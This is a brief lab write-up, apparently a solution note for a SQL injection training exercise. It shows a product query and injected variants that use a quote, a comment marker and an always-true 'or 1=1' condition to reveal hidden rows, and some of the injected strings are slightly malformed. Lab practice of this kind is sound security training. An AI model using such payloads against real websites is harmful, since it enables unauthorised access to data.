# Lab: SQL injection vulnerability in WHERE clause allowing retrieval of hidden data
``` SELECT * FROM products WHERE category = 'Gifts' AND released = 1
 ```

 Soln--> SELECT * FROM products WHERE category = ' '  ' --+ AND released = 1

 SELECT * FROM products WHERE category = ' '  or 1=1  ' --+ AND released = 1


"Robin Nikita"